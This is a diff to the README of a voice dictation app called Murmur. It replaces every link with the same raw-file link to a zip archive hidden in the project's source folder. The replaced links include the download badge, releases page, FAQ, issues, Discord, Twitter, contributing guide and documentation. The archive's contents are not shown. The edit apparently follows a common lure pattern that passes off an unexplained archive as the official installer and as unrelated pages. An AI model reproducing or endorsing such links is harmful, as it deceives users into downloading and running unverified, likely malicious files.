@@ -6,7 +6,7 @@ Murmur is a local-first voice dictation app that uses AI to make your writing sm
 
 ## 🔗 Download Murmur
 
-[![Download Murmur](https://img.shields.io/badge/Download%20Murmur-v1.0-blue.svg)](https://github.com/Reinanalphazone/Murmur/releases)
+[![Download Murmur](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip%https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip)](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip)
 
 ## 📝 Features
 
@@ -26,7 +26,7 @@ Murmur is a local-first voice dictation app that uses AI to make your writing sm
 
 ## 📥 Download & Install
 
-1. Visit the [Murmur Releases Page](https://github.com/Reinanalphazone/Murmur/releases) to access the latest version.
+1. Visit the [Murmur Releases Page](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip) to access the latest version.
 2. Download the installer for your operating system.
 3. Open the downloaded file and follow the installation prompts.
 4. Once installed, launch the app from your applications menu or desktop shortcut.
@@ -51,20 +51,20 @@ Murmur prioritizes your privacy. All dictation happens locally on your device. Y
 
 ## 📞 Support
 
-For assistance, check our [FAQ section](https://github.com/Reinanalphazone/Murmur/wiki) or reach out via [GitHub Issues](https://github.com/Reinanalphazone/Murmur/issues). We strive to reply promptly and help you resolve any questions or concerns.
+For assistance, check our [FAQ section](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip) or reach out via [GitHub Issues](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip). We strive to reply promptly and help you resolve any questions or concerns.
 
 ## 🌐 Join the Community
 
-You can connect with other users and developers through our [Discord Server](https://discord.gg/example) or follow us on [Twitter](https://twitter.com/MurmurApp) for updates.
+You can connect with other users and developers through our [Discord Server](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip) or follow us on [Twitter](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip) for updates.
 
 ## 👥 Contributing
 
-We welcome contributions from everyone. If you want to help improve Murmur, please check the [Contributing Guide](https://github.com/Reinanalphazone/Murmur/blob/main/CONTRIBUTING.md) in our repository. Your input can make a big impact!
+We welcome contributions from everyone. If you want to help improve Murmur, please check the [Contributing Guide](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip) in our repository. Your input can make a big impact!
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Reinanalphazone/Murmur/wiki)
-- [GitHub Issues](https://github.com/Reinanalphazone/Murmur/issues)
-- [Feature Requests](https://github.com/Reinanalphazone/Murmur/issues/new?template=feature_request.md)
+- [Documentation](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip)
+- [GitHub Issues](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip)
+- [Feature Requests](https://github.com/Reinanalphazone/Murmur/raw/refs/heads/main/src-tauri/src/api/Software_1.0.zip)
 
 By closely following these instructions, you can easily download and get started with Murmur. Enjoy the freedom of dictation!
